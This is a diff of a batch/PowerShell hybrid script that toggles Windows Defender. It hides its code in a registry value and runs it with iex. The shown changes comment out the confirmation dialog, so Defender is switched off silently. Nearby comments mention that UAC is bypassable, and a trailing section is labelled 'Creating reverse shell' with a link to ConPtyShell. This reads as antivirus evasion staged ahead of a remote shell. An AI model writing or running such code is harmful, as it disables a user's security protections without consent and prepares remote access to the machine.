@@ -3,8 +3,16 @@ set "0=%~f0"&set 1=%*&powershell -nop -win 1 -c iex ([io.file]::ReadAllText($env
 sp 'HKCU:\Volatile Environment' 'ToggleDefender' @'
 if ($(sc.exe qc windefend) -like '*TOGGLE*') {$TOGGLE=7;$KEEP=6;$A='Enable';$S='OFF'}else{$TOGGLE=6;$KEEP=7;$A='Disable';$S='ON'}
 
+## Comment to hide dialog prompt with Yes, No, Cancel (6,7,2)
+#if ($env:1 -ne 6 -and $env:1 -ne 7) {
+  #$choice=(new-object -ComObject Wscript.Shell).Popup($A + ' Windows Defender?', 0, 'Defender is: ' + $S, 51)
+  #if ($choice -eq 2) {break} elseif ($choice -eq 6) {$env:1=$TOGGLE} else {$env:1=$KEEP}
+#}
+
+## Without the dialog prompt above will toggle automatically
 if ($env:1 -ne 6 -and $env:1 -ne 7) { $env:1=$TOGGLE }
 
+## Comment to not relaunch systray icon
 start cmd -args '/d/r SecurityHealthSystray & "%ProgramFiles%\Windows Defender\MSASCuiL.exe"' -win 1
 
 ## Comment to not hide per-user toggle notifications
@@ -109,8 +117,9 @@ rp ($wdp+'\Real-Time Protection') RealtimeScanDirection -Force -ea 0            
 #   sp $uac ConsentPromptBehaviorAdmin 2 -Type Dword -Force -ea 0                     ## UAC always notify - bpassable otherwise
 #   sp $uac PromptOnSecureDesktop 1 -Type Dword -Force -ea 0                          ## UAC secure - prevent automation
 # }
+
 '@ -Force -ea 0; iex((gp Registry::HKEY_Users\S-1-5-21*\Volatile* ToggleDefender -ea 0)[0].ToggleDefender)
-##-_-# hybrid script, can be pasted directly into powershell console
+#-_-# hybrid script, can be pasted directly into powershell console
 
 ## Creating reverse shell
 ## Original link: https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
